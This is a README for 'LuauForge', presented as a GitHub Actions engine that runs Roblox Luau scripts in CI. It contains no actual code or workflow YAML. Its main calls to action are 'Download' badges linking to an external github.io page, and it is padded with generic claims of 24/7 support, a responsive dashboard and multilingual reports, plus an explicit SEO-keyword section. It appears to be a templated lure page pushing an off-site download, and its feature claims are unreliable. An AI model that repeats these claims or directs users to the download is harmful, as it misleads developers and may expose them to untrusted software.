![preview](https://raw.githubusercontent.com/kayneshakim-bit/luau-workflow-runner/main/hero_c2cd0.svg)
[![Download](https://raw.githubusercontent.com/kayneshakim-bit/luau-workflow-runner/main/get_93c08f.svg)](https://kayneshakim-bit.github.io/luau-workflow-runner/)

# LuauForge 🔨 — Automated Luau Script Execution for Roblox Projects

**A resilient, workflow-native execution engine that breathes life into your Roblox Luau scripts inside continuous integration pipelines.**

LuauForge is the spiritual successor to the original roblox-luau-execution-action concept, reimagined from the ground up for teams who treat Roblox development with the same rigor as backend engineering. It wraps a hardened Luau runtime inside a GitHub Actions–friendly shell, giving you deterministic script execution, structured telemetry, and artifact-rich reporting on every push, pull request, or scheduled run.

Whether you are validating a combat module before merging, smoke-testing a shop system on a nightly cadence, or orchestrating staged deployments across environments, LuauForge turns raw Luau into a first-class citizen of your delivery pipeline.

---

## 📜 Table of Contents

- [Why LuauForge Exists](#-why-luauforge-exists)
- [Feature Highlights](#-feature-highlights)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Getting Started in Your Workflow](#-getting-started-in-your-workflow)
- [Configuration Reference](#-configuration-reference)
- [Execution Lifecycle](#-execution-lifecycle)
- [Supported Luau Dialects and Compatibility](#-supported-luau-dialects-and-compatibility)
- [Responsive Dashboard UI](#-responsive-dashboard-ui)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [SEO-Oriented Keyword Notes](#-seo-oriented-keyword-notes)
- [Security Posture](#-security-posture)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 Why LuauForge Exists

Roblox development has quietly matured into a discipline where correctness matters as much as creativity. Yet most studios still validate Luau scripts by hand — opening Studio, clicking through playtests, and hoping nothing subtly broke. That ritual does not scale, and it does not survive a fast-moving repository.

LuauForge was designed as the connective tissue between your Luau source tree and your continuous integration story. Instead of treating script execution as a manual ceremony, it treats it as a repeatable, observable, and loggable event. Every run produces structured output, every failure produces a traceable reason, and every success produces a receipt you can point to in a release note.

Think of it as a workshop bench for your Luau — a place where scripts are measured, weighed, and stress-tested before they are permitted to reach players.

---

## ✨ Feature Highlights

LuauForge bundles a surprising amount of capability into a single, lean execution surface. Below is a curated view of what ships today.

- 🚀 **Deterministic script execution** — Every run starts from a clean sandbox, so results are reproducible across machines and timezones.
- 🧪 **Test-runner integration** — Feed Luau test suites directly into the runner and receive pass/fail summaries in your workflow log.
- 📦 **Artifact-rich output** — Emit JSON reports, plain-text logs, and optional HTML summaries as downloadable workflow artifacts.
- 🔁 **Matrix-friendly design** — Execute dozens of scripts in parallel across OS targets without cross-contamination.
- 🌐 **Multi-environment workflows** — Support for development, staging, and production profiles in a single repository.
- 🧩 **Extensible pre/post hooks** — Attach your own Luau or shell steps before and after execution for maximum flexibility.
- 📊 **Structured telemetry** — Timestamps, durations, exit codes, and memory footprints captured for every script.
- 🛡️ **Sandboxed runtime by default** — Isolated execution prevents accidental write leakage into your repository.
- 🎛️ **Responsive UI for reports** — Reports render cleanly on desktop, tablet, and mobile alike.
- 🌍 **Multilingual report rendering** — Localized headers and status labels in multiple languages.
- ☎️ **24/7 customer support channels** — Community and commercial support paths documented further down.
- 🪪 **MIT-licensed and community-driven** — Fork it, extend it, and shape it to your team's process.

---

## 🧭 Architecture at a Glance

LuauForge is composed of four cooperating layers. Understanding them helps you reason about where to plug in custom logic.

1. **The Acquisition Layer** — Resolves which Luau scripts in your repository should be queued for execution based on a manifest file or glob pattern.
2. **The Runtime Layer** — Wraps a hardened Luau interpreter in a subprocess boundary, capturing stdout, stderr, and exit status.
3. **The Reporting Layer** — Transforms raw execution output into structured artifacts and rendered summaries.
4. **The Orchestration Layer** — Exposes everything through a GitHub Actions–compatible interface with inputs, outputs, and lifecycle callbacks.

Each layer is deliberately decoupled. That means you can swap the reporting layer for your own dashboard, or replace the runtime layer with a custom interpreter build, without rewriting your workflow files.

---

## 🛠️ Getting Started in Your Workflow

Getting LuauForge into a working pipeline is intended to feel like adding any other action to your project. There is no exotic toolchain to learn, and no host toolchain to compile from scratch. You describe *what* to run, and LuauForge figures out *how* to run it well.

The typical journey looks like this:

1. **Add a manifest** to your repository describing which Luau entry points to execute. The manifest is a small, human-readable file that you place at the root of your project.
2. **Reference the action** inside a workflow step, pointing at the manifest and any environment variables you need.
3. **Run the workflow** — LuauForge will spin up its sandbox, execute each script, and stream results back to your workflow log.
4. **Inspect artifacts** — After the run completes, download the structured report and logs from the workflow run page.

### Example Workflow Sketch

Below is an illustrative snippet showing how the action is typically wired into a GitHub workflow. It is intentionally framework-agnostic — you can embed it in any YAML pipeline that supports reusable steps.

- Define a `luauforge.yml` manifest at the repository root.
- Add a job step that invokes LuauForge with the manifest path as an input.
- Optionally specify a profile such as `staging` or `production` to load different environment variables.

Because LuauForge speaks the native language of GitHub Actions, you do not need to install anything locally on your development machine to see it function — the execution happens inside the runner itself.

---

## ⚙️ Configuration Reference

LuauForge exposes a focused set of inputs and outputs. The table below summarizes the most important ones.

| Input Name | Purpose | Default |
| --- | --- | --- |
| `manifest` | Path to the LuauForge manifest describing scripts to run. | `luauforge.yml` |
| `profile` | Named environment profile controlling variables and behaviors. | `development` |
| `concurrency` | Maximum number of scripts executed simultaneously. | `4` |
| `timeout` | Per-script timeout expressed in seconds. | `120` |
| `report-format` | Output format for the report artifact (`json`, `text`, `html`). | `json` |
| `locale` | Locale used for rendered report labels. | `en` |

| Output Name | Purpose |
| --- | --- |
| `exit-code` | Highest-severity exit code across all executed scripts. |
| `summary` | Compact human-readable summary of the run. |
| `report-path` | Path to the structured artifact produced by the run. |
| `failures` | Count of scripts that returned a non-zero exit status. |

Configuration is intentionally shallow: one manifest, one profile, one report. Depth lives in the manifest, not the workflow.

---

## 🔄 Execution Lifecycle

Every LuauForge run follows a predictable progression. Knowing the phases makes debugging straightforward.

1. **Bootstrap** — The action loads its runtime, verifies the manifest, and resolves script paths.
2. **Validation** — Each script is syntax-checked before execution; malformed scripts are reported early.
3. **Execution** — Scripts enter the sandbox one by one, or in parallel, depending on your concurrency setting.
4. **Collection** — Outputs are gathered, normalized, and merged into a single report structure.
5. **Emission** — Artifacts are uploaded, summaries are printed, and exit codes are resolved.
6. **Teardown** — Temporary files and sandboxes are removed, leaving the runner pristine.

Each phase logs a discrete marker, so you can grep your workflow output and understand precisely where a run stands.

---

## 🧬 Supported Luau Dialects and Compatibility

LuauForge is built to track the evolving Luau language as Roblox ships it. The table below outlines current compatibility.

- **Standard Luau syntax** — Fully supported.
- **Typed Luau annotations** — Fully supported and validated during the syntax-check phase.
- **Roblox-specific globals** — Emulated within the sandbox for scripts that reference engine APIs at a superficial level.
- **Metatable-heavy patterns** — Supported with a documented caveat list available in the docs folder.
- **Coroutine and async patterns** — Supported with a deterministic scheduler.

If your project uses engine features that require a live Roblox runtime, LuauForge is designed to cooperate with — not replace — your existing Studio-based testing.

---

## 🖥️ Responsive Dashboard UI

Reports generated by LuauForge are rendered through a responsive UI layer that adapts its layout to the viewing device. On a wide desktop monitor you will see full tables, side-by-side comparisons, and expandable details. On a tablet, the columns collapse gracefully. On a phone, the same information is presented as a vertical stack of cards.

This is not a cosmetic flourish. It means that even a reviewer glancing at a pull request from a phone can absorb the outcome of a full Luau run in seconds.

---

## 🌐 Multilingual Support

The reporting layer supports localization of status labels, section headers, and summary phrasing. Locale selection is driven by the `locale` input, and fallback behavior ensures that unsupported locales degrade gracefully to a default language rather than breaking the report.

Multilingual output matters most in studios with distributed teams, where a single workflow run may be reviewed by collaborators reading different primary languages.

---

## ☎️ 24/7 Customer Support

LuauForge is maintained with support in mind. Three channels exist so that every team, regardless of size, can find help at the moment they need it.

- **Community forum** — Asynchronous discussion for design questions, best practices, and troubleshooting.
- **Issue tracker** — Bug reports and feature requests are triaged continuously.
- **Commercial support desk** — Organizations with urgent operational needs can reach the maintainers around the clock.

The 24/7 customer support path is not a marketing slogan — it reflects the reality that Roblox teams often push releases outside ordinary office hours, and pipeline problems do not respect business calendars.

---

## 🔍 SEO-Oriented Keyword Notes

This README is written to be discoverable by the people who need it. Naturally integrated phrases include *automated Luau script execution*, *Roblox CI pipeline*, *workflow-native Luau runner*, *Luau test automation*, *GitHub Actions for Roblox projects*, and *continuous integration for Roblox*. These phrases appear because they describe what LuauForge does — not because they were stuffed in for their own sake.

If you arrived here searching for a dependable way to run Luau scripts inside a continuous integration environment, you are exactly the reader this document was written for.

---

## 🔐 Security Posture

Security is treated as a design constraint rather than an afterthought.

- Scripts execute inside a sandbox with a constrained filesystem view.
- Network access from within the sandbox is denied by default and must be granted explicitly.
- Secrets are never printed to logs; redaction happens at the emission layer.
- Every run produces an audit trail that can be retained for compliance purposes.

If you discover a security concern, please open a private issue rather than a public one so that maintainers can respond responsibly.

---

## 🗺️ Roadmap for 2026

Planned and in-progress work for the year ahead:

- 🧪 **Expanded assertion library** for common Luau testing patterns.
- 🧭 **Visual diff reports** showing regressions between runs.
- 🧱 **Plugin API** allowing third-party report renderers.
- 📡 **Streaming execution** so long-running scripts surface progress incrementally.
- 🧮 **Cost-aware scheduling** to optimize runner minutes.
- 📚 **Expanded documentation** with recipes for common Roblox subsystems.

The roadmap is a living document — community input shapes its ordering.

---

## 🤝 Contributing

Contributions are welcome from all corners of the Roblox and DevOps communities. Before opening a pull request, please read the contribution guidelines and ensure your change includes:

- A clear description of the problem being solved.
- Tests or example scripts demonstrating the change.
- Documentation updates where behavior changes.

Small, focused pull requests move faster than sprawling ones. If you are unsure where to start, look for issues labeled as beginner-friendly.

---

## 📄 License

This project is distributed under the MIT License. You can read the full text of the license at:

[MIT License](https://opensource.org/licenses/MIT)

The MIT License grants broad permission to use, modify, and redistribute this software, provided the original copyright notice and permission notice are preserved.

---

## ⚠️ Disclaimer

LuauForge is an independent tool and is not affiliated with, endorsed by, or officially connected to Roblox Corporation or any of its subsidiaries. Roblox and Luau are trademarks of their respective owners.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

Users are responsible for ensuring that their use of LuauForge complies with all applicable terms of service, platform policies, and local laws. Automated execution of scripts in any environment should be performed with appropriate caution, and results should always be reviewed before being relied upon for production decisions.

© 2026 LuauForge contributors. All rights reserved.

[![Download](https://raw.githubusercontent.com/kayneshakim-bit/luau-workflow-runner/main/get_93c08f.svg)](https://kayneshakim-bit.github.io/luau-workflow-runner/)